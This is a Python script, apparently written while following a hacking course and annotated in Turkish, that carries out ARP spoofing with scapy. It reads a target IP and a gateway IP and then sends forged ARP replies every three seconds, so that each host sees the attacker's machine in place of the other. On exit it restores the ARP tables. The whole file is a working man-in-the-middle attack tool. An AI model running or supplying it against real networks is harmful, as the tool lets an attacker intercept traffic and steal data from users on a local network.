import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    # scapy.ls () verilen parametredeki fonksiyonun nasil kullanilacagini gosterir
    # scapy.ls(scapy.ARP())
    # bunun icin terminalde my_net_scanner calistiralim
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast destinationumuz ff herkese gidecek
    # 2 paketi tek paket haline getirdik asagida
    combined_packet = broadcast_packet/arp_request_packet
    # bu bize liste dondurecek bunun ilk ciktisini alalim(answeredList)
    # scapy nin bize verdigi sonuc icerisinden 0.index 1. sinin "hwsrc" yani kaynak mac adresi alalim
    # verbose sayesinde herseyi yazdirmayacak
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

# yapilan islemleri eski haline getirip cikacagiz
def reset_operation(fooled_ip,gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print ("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

# scapy.ls(scapy.ARP())

# scapy.ls den scapy.arp icin inceleme yaptigimizda "op" degeri
# 1 icin arp-request op=2 icin arp-response anlamina gelir.
# pdst - Hedef anlamina gelir, windows makinemin ipsini verecegim
# hwdst = mac_address , psrc(sourceIpField),hwsrc(ARPSourceMacField) = kimden saldiri yapildigi
# saldirdigimiz makineye-modem-e windows cihaz oldugumuz izlenimi verirsek sorun kalmaz

# arp-a ile windows makineden mac adreslerine bakabiliriz- modem e windows
# windows a modem gibi gorunebildik.
try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)

        number += 2
        print("\rSending packets" + str(number),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)